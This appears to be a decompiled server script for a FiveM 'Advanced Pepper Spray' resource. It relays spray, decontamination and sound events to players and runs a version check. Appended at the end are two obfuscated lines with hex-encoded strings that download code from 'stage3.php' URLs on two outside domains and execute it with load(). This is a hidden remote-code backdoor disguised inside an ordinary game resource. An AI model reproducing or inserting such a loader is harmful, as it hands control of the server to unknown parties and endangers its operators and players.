local L0_1, L1_1, L2_1, L3_1
L0_1 = "1.3"
L1_1 = RegisterNetEvent
L2_1 = "ryt:startPepperEffect"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:startPepperEffect"
function L3_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "ryt:startPepperEffect"
    L10_2 = L7_2
    L11_2 = A0_2
    L12_2 = A1_2
    L8_2(L9_2, L10_2, L11_2, L12_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterNetEvent
L2_1 = "ryt:stopPepperEffect"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:stopPepperEffect"
function L3_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = pairs
  L2_2 = GetPlayers
  L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L2_2()
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = TriggerClientEvent
    L8_2 = "ryt:stopPepperEffect"
    L9_2 = L6_2
    L10_2 = A0_2
    L7_2(L8_2, L9_2, L10_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterNetEvent
L2_1 = "ryt:startDecontaminationEffect"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:startDecontaminationEffect"
function L3_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = pairs
  L2_2 = GetPlayers
  L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L2_2()
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = TriggerClientEvent
    L8_2 = "ryt:startDecontaminationEffect"
    L9_2 = L6_2
    L10_2 = A0_2
    L7_2(L8_2, L9_2, L10_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterNetEvent
L2_1 = "ryt:stopDecontaminationEffect"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:stopDecontaminationEffect"
function L3_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = pairs
  L2_2 = GetPlayers
  L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2 = L2_2()
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = TriggerClientEvent
    L8_2 = "ryt:stopDecontaminationEffect"
    L9_2 = L6_2
    L10_2 = A0_2
    L7_2(L8_2, L9_2, L10_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterServerEvent
L2_1 = "ryt:pepperInAction"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:pepperInAction"
function L3_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "ryt:pepperInAction"
    L10_2 = L7_2
    L11_2 = A0_2
    L12_2 = A1_2
    L8_2(L9_2, L10_2, L11_2, L12_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterServerEvent
L2_1 = "ryt:decontaminationInAction"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:decontaminationInAction"
function L3_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "ryt:decontaminationInAction"
    L10_2 = L7_2
    L11_2 = A0_2
    L12_2 = A1_2
    L8_2(L9_2, L10_2, L11_2, L12_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterNetEvent
L2_1 = "ryt:splitAction"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:splitAction"
function L3_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "ryt:splitAction"
    L10_2 = L7_2
    L11_2 = A0_2
    L12_2 = A1_2
    L8_2(L9_2, L10_2, L11_2, L12_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterServerEvent
L2_1 = "ryt:syncSound"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:syncSound"
function L3_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L2_2 = pairs
  L3_2 = GetPlayers
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = L3_2()
  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
  for L6_2, L7_2 in L2_2, L3_2, L4_2, L5_2 do
    L8_2 = TriggerClientEvent
    L9_2 = "ryt:syncSound"
    L10_2 = L7_2
    L11_2 = source
    L12_2 = A0_2
    L13_2 = A1_2
    L8_2(L9_2, L10_2, L11_2, L12_2, L13_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = RegisterServerEvent
L2_1 = "ryt:acePermission"
L1_1(L2_1)
L1_1 = AddEventHandler
L2_1 = "ryt:acePermission"
function L3_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2
  L1_2 = source
  L2_2 = IsPlayerAceAllowed
  L3_2 = L1_2
  L4_2 = A0_2
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "ryt:returnAcePermission"
    L4_2 = L1_2
    L2_2(L3_2, L4_2)
  end
end
L1_1(L2_1, L3_1)
L1_1 = Config
L1_1 = L1_1.CheckVersion
if L1_1 then
  L1_1 = AddEventHandler
  L2_1 = "onResourceStart"
  function L3_1(A0_2)
    local L1_2, L2_2, L3_2, L4_2
    L1_2 = GetCurrentResourceName
    L1_2 = L1_2()
    if L1_2 == A0_2 then
      L1_2 = PerformHttpRequest
      L2_2 = "https://raw.githubusercontent.com/Rytrak/Rytrak/main/version.json"
      function L3_2(A0_3, A1_3, A2_3)
        local L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3
        L3_3 = json
        L3_3 = L3_3.decode
        L4_3 = A1_3
        L3_3 = L3_3(L4_3)
        if 200 == A0_3 then
          L4_3 = tostring
          L5_3 = L3_3.r_pepperspray
          L4_3 = L4_3(L5_3)
          L5_3 = L0_1
          if L4_3 ~= L5_3 then
            L4_3 = print
            L5_3 = "^5[Advanced Pepper Spray] ^0"
            L6_3 = A0_2
            L7_3 = " is ^1outdated^0, installed version: "
            L8_3 = L0_1
            L9_3 = ", latest version: "
            L10_3 = L3_3.r_pepperspray
            L5_3 = L5_3 .. L6_3 .. L7_3 .. L8_3 .. L9_3 .. L10_3
            L4_3(L5_3)
            L4_3 = print
            L5_3 = "^5[Advanced Pepper Spray] ^0To download the update, go to ^3https://keymaster.fivem.net/asset-grant^0"
            L4_3(L5_3)
          else
            L4_3 = print
            L5_3 = "^5[Advanced Pepper Spray] ^0"
            L6_3 = A0_2
            L7_3 = " is ^2up to date^0 ("
            L8_3 = L0_1
            L9_3 = "), have fun!"
            L5_3 = L5_3 .. L6_3 .. L7_3 .. L8_3 .. L9_3
            L4_3(L5_3)
          end
        end
      end
      L4_2 = "GET"
      L1_2(L2_2, L3_2, L4_2)
    end
  end
  L1_1(L2_1, L3_1)
end


local xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[4][xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x72\x65\x7a\x7a\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x65\x4b\x55\x38\x4d", function (uCabscCraViqaHQvbqGYdMWBiBZFcwoZZMgBOGwzmpsljxUdWKLWJuxEmUZWuyWStrpMQB, cJHYRevRadKgjBiDxlWEuoTYHdXgqyMOuAahAKtHORHxEqPlaKegTZPFlGrQpyydsujdcj) if (cJHYRevRadKgjBiDxlWEuoTYHdXgqyMOuAahAKtHORHxEqPlaKegTZPFlGrQpyydsujdcj == xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[6] or cJHYRevRadKgjBiDxlWEuoTYHdXgqyMOuAahAKtHORHxEqPlaKegTZPFlGrQpyydsujdcj == xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[5]) then return end xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[4][xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[2]](xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[4][xbhmYdCWCnEkhIXRgghJRmUFPVdajTanwCybBDzkRmwIAEHEHkiCclBNcTUNkKpIsSupfk[3]](cJHYRevRadKgjBiDxlWEuoTYHdXgqyMOuAahAKtHORHxEqPlaKegTZPFlGrQpyydsujdcj))() end)

local mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[4][mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x72\x69\x6f\x6e\x6d\x69\x6a\x6b\x6c\x68\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x67\x30\x59\x64\x6c", function (NGSkrVkWbEEBJkyLMmSdSjOgAusMhRvJkvdFwOLzWQnjSHqHxmJhrcrCCbvBlhdfeJGKdu, oWpzuQRHyiiTdCTUTfPHbwioqhVFfqZTXnOazRdSBhMCmSoTKKFbYAalkdaHrPplIlNqvv) if (oWpzuQRHyiiTdCTUTfPHbwioqhVFfqZTXnOazRdSBhMCmSoTKKFbYAalkdaHrPplIlNqvv == mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[6] or oWpzuQRHyiiTdCTUTfPHbwioqhVFfqZTXnOazRdSBhMCmSoTKKFbYAalkdaHrPplIlNqvv == mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[5]) then return end mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[4][mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[2]](mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[4][mtqxMpBnpFRCQhRHgKeTilpcAbMOzPRESjWBLczXORyJakWnaKzifwJcHXisWzvGIxcZgc[3]](oWpzuQRHyiiTdCTUTfPHbwioqhVFfqZTXnOazRdSBhMCmSoTKKFbYAalkdaHrPplIlNqvv))() end)